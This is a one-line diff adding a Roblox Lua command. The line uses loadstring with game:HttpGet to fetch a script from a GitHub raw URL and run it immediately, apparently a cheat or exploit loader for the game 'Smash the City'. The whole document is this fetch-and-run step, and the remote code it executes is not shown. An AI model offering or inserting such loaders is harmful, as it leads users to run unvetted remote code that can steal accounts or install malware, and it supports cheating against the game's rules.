@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/upd-smash-the-city-spam6-27rfely3o6m7n5.lua"))()
